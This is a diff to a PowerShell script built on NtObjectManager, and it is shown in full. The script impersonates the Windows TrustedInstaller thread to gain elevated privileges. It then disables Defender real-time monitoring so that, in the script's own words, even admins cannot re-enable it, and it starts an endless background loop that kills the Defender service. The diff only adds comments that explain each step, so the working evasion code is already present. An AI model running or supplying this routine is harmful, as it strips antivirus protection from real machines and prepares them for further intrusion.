@@ -7,23 +7,30 @@ Import-Module .\NtObjectManager.psm1
 
 function Invoke-TrustedInstaller {
     Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+
+    # Start the TI service
     Start-NtService TrustedInstaller
 
+    # Extract the TI thread object
     $ti = Get-NtProcess -Name 'TrustedInstaller.exe'
     $ti_thread = $ti.GetFirstThread()
 
+    # Impersonate the TI thread
     $current = Get-NtThread -Current -PseudoHandle
     $imp = $current.ImpersonateThread($ti_thread)
 
+    # Disable real-time monitoring as TI so that even admins don't have permission to re-enable it
     Set-MpPreference -DisableRealtimeMonitoring $true -Force
 
+    # Start an infinite loop that keeps killing the Windows Defender service
+    # you need TI privileges to do this
     Start-Job -ScriptBlock {
         while (1) {
-            # Demo of something that requires TI privileges
             cmd.exe /c "taskkill /f /im MsMpSvc.exe"
         }
     }
 
+    # Print proof that we've successfully impersonated TI
     $imp_token = Get-NtToken -Impersonation
     $imp_token.Groups | Where-Object { $_.Sid.name -match 'TrustedInstaller' }
 }
